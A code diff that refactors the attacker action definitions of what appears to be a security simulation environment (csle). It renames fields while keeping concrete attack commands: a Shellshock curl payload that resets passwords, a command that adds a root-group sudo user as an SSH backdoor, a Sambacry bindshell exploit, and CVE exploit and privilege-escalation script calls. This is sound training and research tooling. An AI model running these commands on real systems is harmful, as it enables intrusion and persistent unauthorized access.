@@ -4,6 +4,7 @@ from csle_common.dao.action.attacker.attacker_action_type import AttackerActionT
 from csle_common.dao.action.attacker.attacker_action_id import AttackerActionId
 from csle_common.dao.action.attacker.attacker_action import AttackerActionOutcome
 
+
 class AttackerShellActions:
     """
     Class implementing regular Bash actions for the attacker (e.g. interacting with filesystem or OS)
@@ -20,11 +21,11 @@ class AttackerShellActions:
         id = AttackerActionId.FIND_FLAG
         cmd = ["find / -name 'flag*.txt'  2>&1 | grep -v 'Permission denied'"]
         alt_cmd = ["find / | grep 'flag*'"]
-        return AttackerAction(id=id, name="Find flag", cmd=cmd,
+        return AttackerAction(id=id, name="Find flag", cmds=cmd,
                               type=AttackerActionType.POST_EXPLOIT,
                               descr="Searches the file system for a flag",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.FLAG, alt_cmd=alt_cmd,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.FLAG, alt_cmd=alt_cmd,
                               backdoor=False)
 
     @staticmethod
@@ -38,11 +39,11 @@ class AttackerShellActions:
         id = AttackerActionId.INSTALL_TOOLS
         cmd = ["sudo apt-get -y install nmap ssh git unzip lftp",
                "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"]
-        return AttackerAction(id=id, name="Install tools", cmd=cmd,
+        return AttackerAction(id=id, name="Install tools", cmds=cmd,
                               type=AttackerActionType.POST_EXPLOIT,
                               descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.PIVOTING, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.PIVOTING, alt_cmd=None,
                               backdoor=False)
 
     @staticmethod
@@ -55,12 +56,12 @@ class AttackerShellActions:
         """
         id = AttackerActionId.SSH_BACKDOOR
         cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p \"$(openssl passwd -1 '{}')\" {}"]
-        return AttackerAction(id=id, name="Install SSH backdoor", cmd=cmd,
+        return AttackerAction(id=id, name="Install SSH backdoor", cmds=cmd,
                               type=AttackerActionType.POST_EXPLOIT,
                               descr="If taken root on remote machine, installs a ssh backdoor, useful for upgrading telnet"
                             "or weaker channels",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.PIVOTING, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.PIVOTING, alt_cmd=None,
                               backdoor=True)
 
     @staticmethod
@@ -74,12 +75,12 @@ class AttackerShellActions:
         id = AttackerActionId.SAMBACRY_EXPLOIT
         cmd = ["sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data "
                "-r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"]
-        return AttackerAction(id=id, name="Sambacry Explolit", cmd=cmd,
+        return AttackerAction(id=id, name="Sambacry Explolit", cmds=cmd,
                               type=AttackerActionType.EXPLOIT,
                               descr="Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor "
                             "to upgrade the channel",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                               vulnerability=constants.SAMBA.VULNERABILITY_NAME,
                               backdoor=True)
 
@@ -98,11 +99,11 @@ class AttackerShellActions:
                "curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'echo {}:{} | sudo /usr/sbin/chpasswd'\" "
                "http://{}:80/cgi-bin/vulnerable"
                ]
-        return AttackerAction(id=id, name="ShellShock Explolit", cmd=cmd,
+        return AttackerAction(id=id, name="ShellShock Explolit", cmds=cmd,
                               type=AttackerActionType.EXPLOIT,
                               descr="Uses the Shellshock exploit and curl to do remote code execution and create a backdoor",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                               vulnerability=constants.SHELLSHOCK.VULNERABILITY_NAME,
                               backdoor=True)
 
@@ -116,11 +117,11 @@ class AttackerShellActions:
         """
         id = AttackerActionId.DVWA_SQL_INJECTION
         cmd = ["/sql_injection_exploit.sh"]
-        return AttackerAction(id=id, name="DVWA SQL Injection Exploit", cmd=cmd,
+        return AttackerAction(id=id, name="DVWA SQL Injection Exploit", cmds=cmd,
                               type=AttackerActionType.EXPLOIT,
                               descr="Uses the DVWA SQL Injection exploit to extract secret passwords",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                               vulnerability=constants.DVWA_SQL_INJECTION.VULNERABILITY_NAME,
                               backdoor=True)
 
@@ -134,12 +135,12 @@ class AttackerShellActions:
         """
         id = AttackerActionId.CVE_2015_3306_EXPLOIT
         cmd = ["sudo /root/miniconda3/bin/python3 /cve_2015_3306_exploit.py --port 21 --path '/var/www/html/' --host {}"]
-        return AttackerAction(id=id, name="CVE-2015-3306 exploit", cmd=cmd,
+        return AttackerAction(id=id, name="CVE-2015-3306 exploit", cmds=cmd,
                               type=AttackerActionType.EXPLOIT,
                               descr="Uses the CVE-2015-3306 vulnerability to get remote code execution and then sets up a SSH backdoor "
                             "to upgrade the channel",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                               vulnerability=constants.CVE_2015_3306.VULNERABILITY_NAME,
                               backdoor=True)
 
@@ -154,12 +155,12 @@ class AttackerShellActions:
         """
         id = AttackerActionId.CVE_2015_1427_EXPLOIT
         cmd = ["/cve_2015_1427_exploit.sh {}:9200"]
-        return AttackerAction(id=id, name="CVE-2015-1427 exploit", cmd=cmd,
+        return AttackerAction(id=id, name="CVE-2015-1427 exploit", cmds=cmd,
                               type=AttackerActionType.EXPLOIT,
                               descr="Uses the CVE-2015-1427 vulnerability to get remote code execution and then sets up a SSH backdoor "
                             "to upgrade the channel",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                               vulnerability=constants.CVE_2015_1427.VULNERABILITY_NAME,
                               backdoor=True)
 
@@ -173,12 +174,12 @@ class AttackerShellActions:
         """
         id = AttackerActionId.CVE_2016_10033_EXPLOIT
         cmd = ["/cve_2016_10033_exploit.sh {}:80"]
-        return AttackerAction(id=id, name="CVE-2016-10033 exploit", cmd=cmd,
+        return AttackerAction(id=id, name="CVE-2016-10033 exploit", cmds=cmd,
                               type=AttackerActionType.EXPLOIT,
                               descr="Uses the CVE-2016-10033 vulnerability to get remote code execution and then sets up a SSH backdoor "
                             "to upgrade the channel",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                               vulnerability=constants.CVE_2016_10033.VULNERABILITY_NAME,
                               backdoor=True)
 
@@ -192,11 +193,11 @@ class AttackerShellActions:
         """
         id = AttackerActionId.CVE_2010_0426_PRIV_ESC
         cmd = ["/cve_2010_0426_exploit.sh {}", "/create_backdoor_cve_2010_0426.sh"]
-        return AttackerAction(id=id, name="CVE-2010-0426 exploit", cmd=cmd,
+        return AttackerAction(id=id, name="CVE-2010-0426 exploit", cmds=cmd,
                               type=AttackerActionType.PRIVILEGE_ESCALATION,
                               descr="Uses the CVE-2010-0426 vulnerability to perform privilege escalation to get root access",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                               alt_cmd=None,
                               vulnerability=constants.CVE_2010_0426.VULNERABILITY_NAME,
                               backdoor=True)
@@ -212,10 +213,10 @@ class AttackerShellActions:
         id = AttackerActionId.CVE_2015_5602_PRIV_ESC
         cmd = ["/cve_2015_5602_exploit.sh", "su root", constants.CVE_2015_5602.ROOT_PW,
                "/create_backdoor_cve_2015_5602.sh"]
-        return AttackerAction(id=id, name="CVE-2015-5602 exploit", cmd=cmd,
+        return AttackerAction(id=id, name="CVE-2015-5602 exploit", cmds=cmd,
                               type=AttackerActionType.PRIVILEGE_ESCALATION,
                               descr="Uses the CVE-2015-5602 vulnerability to perform privilege escalation to get root access",
-                              cost=0.0, noise=0.0, index=index,
-                              ips=None, subnet=False, action_outcome=AttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
+                              index=index,
+                              ips=[], subnet=False, action_outcome=AttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                               alt_cmd=None, vulnerability=constants.CVE_2015_5602.VULNERABILITY_NAME,
                               backdoor=True)
